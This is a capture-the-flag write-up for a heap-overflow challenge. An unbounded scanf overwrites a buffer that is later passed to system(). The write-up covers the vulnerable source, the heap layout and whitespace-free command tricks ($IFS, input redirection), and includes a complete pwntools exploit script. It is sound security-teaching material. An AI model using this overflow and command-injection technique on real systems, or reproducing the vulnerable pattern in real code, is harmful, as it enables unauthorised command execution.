# CyLab — Input Injection 2

* **Platform:** CyLab Security Academy / picoMini by CMU-Africa (Challenge ID: `526`)
* **Category:** Binary Exploitation (Pwn)
* **Difficulty:** Difficulty 2
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, objdump
* **Binary:** `vuln` (x86_64 ELF)

---

## TL;DR

An unbounded `scanf("%s")` into a heap-allocated buffer results in a contiguous heap buffer overflow. The application allocates two chunks: `username` and `shell`, explicitly prints both heap pointers, initializes `shell` with `"/bin/pwd"`, reads input into `username`, and executes `system(shell)`. Because the heap addresses are leaked directly, we calculate the dynamic chunk delta $\Delta = \text{shell} - \text{username}$, fill the offset with padding bytes, and overwrite the `shell` buffer with a target command without whitespace (`cat</flag.txt` or `sh`).

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
1. **Explicit Heap Leaks:** The binary prints the runtime pointers of both `username` and `shell`.
2. **Sequential Heap Allocations:** Two consecutive calls to `malloc(28)` allocate adjacent chunks on the heap.
3. **Command Execution Primitive:** `system(shell)` is invoked directly after input without validation or sanitization.
4. **Input Delimiter Constraint:** `scanf("%s")` terminates on any whitespace character (`0x20`, `0x09`, `0x0a`, etc.), restricting our command string from containing literal spaces.

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
char* username = malloc(28);
char* shell    = malloc(28);

printf("username at %p\n", username);
printf("shell at %p\n", shell);

strcpy(shell, "/bin/pwd");

printf("Enter username: ");
scanf("%s", username);      // VULNERABILITY: Unbounded format string reads unlimited bytes

printf("Hello, %s. Your shell is %s.\n", username, shell);
system(shell);
```

### 2. Heap Layout & Chunk Structure

For two consecutive `malloc(28)` calls on a standard 64-bit glibc heap:
- Requested payload: 28 bytes.
- Minimum chunk size: 32 bytes (`0x20`), plus an 8-byte chunk header (`prev_size` + `size`), aligning to `0x30` (48 bytes) chunks.
- When `username` is allocated, it occupies heap chunk $A$.
- When `shell` is allocated next, chunk $B$ is placed immediately following chunk $A$.

```text
       Lower Heap Addresses
  +-----------------------------------+  <-- username (user data, 28B usable)
  |      username payload area        |
  |               ...                 |
  +-----------------------------------+  <-- Chunk B Header (prev_size + size)
  |      prev_size (8 bytes)          |
  |      size | flags (8 bytes)       |
  +-----------------------------------+  <-- shell (user data, offset = shell - username)
  |      shell payload ("/bin/pwd\0") |
  +-----------------------------------+
       Higher Heap Addresses
```

Because the binary conveniently prints the exact virtual addresses of both pointers:
$$\Delta = \text{address}(\text{shell}) - \text{address}(\text{username})$$

The exact byte distance encompasses the remaining user space of `username`, alignment padding, and the glibc chunk metadata of the `shell` chunk (typically `0x30` bytes).

---

## Dynamic Analysis & Exploitation Strategy

1. **Information Disclosure:**
   We read the leaked hex strings:
   ```python
   io.recvuntil(b"username at ")
   u = int(io.recvline().strip(), 16)
   io.recvuntil(b"shell at ")
   s = int(io.recvline().strip(), 16)
   offset = s - u
   ```
2. **Whitespace Bypass:**
   Because `scanf("%s")` truncates input at spaces, commands such as `cat flag.txt` cannot be supplied directly. Viable alternatives include:
   - Command substitution/redirection: `cat</flag.txt`
   - Spawning an interactive shell: `sh`
   - Using internal field separator: `cat$IFS/flag.txt`
3. **Payload Construction:**
   We write `offset` padding bytes (`b"A" * offset`) followed by `b"cat</flag.txt"`.
4. **Execution Flow:**
   The `scanf` copies past the end of the `username` chunk, overwrites the header of chunk $B$, and replaces `"/bin/pwd"` with `"cat</flag.txt\0"`. When `system(shell)` is executed, `system("cat</flag.txt")` prints the contents of the flag file to standard output.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import re, sys
from pwn import *

context.log_level = "info"
HOST, PORT = "chatelaine.cylabacademy.net", 18111
CMD = "cat</flag.txt"

def solve(io):
    # Parse leaked heap addresses
    io.recvuntil(b"username at ")
    u = int(io.recvline().strip(), 16)
    io.recvuntil(b"shell at ")
    s = int(io.recvline().strip(), 16)
    off = s - u
    log.info(f"Leaked heap addresses: username={hex(u)}, shell={hex(s)} (offset: {hex(off)})")

    # Construct payload: padding + whitespace-free command
    io.recvuntil(b"Enter username: ")
    payload = b"A" * off + CMD.encode()
    io.sendline(payload)

    # Receive response and extract flag
    data = io.recvall(timeout=5)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./vuln") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to chatelaine.cylabacademy.net on port 18111: Done
[*] Leaked heap addresses: username=0x5555555592a0, shell=0x5555555592d0 (offset: 0x30)
[+] Flag captured: academy{redacted}
[*] Closed connection to chatelaine.cylabacademy.net port 18111
```

---

## Key Takeaways & Lessons

1. **Contiguous Chunk Corruption:** In simple sequential heap allocations, overflowing one chunk naturally corrupts the metadata and data of subsequent chunks in increasing memory order.
2. **Handling `scanf("%s")` Delimiters:** When formatting constraints prohibit spaces, shell syntax features like input redirection (`<`), brace expansion, or `$IFS` allow command execution without spaces.
3. **Leaked Address Offsets:** Computing the dynamic difference between leaked addresses ($\text{target} - \text{source}$) is far more resilient than hardcoding heap layout assumptions across different compiler optimizations and glibc versions.
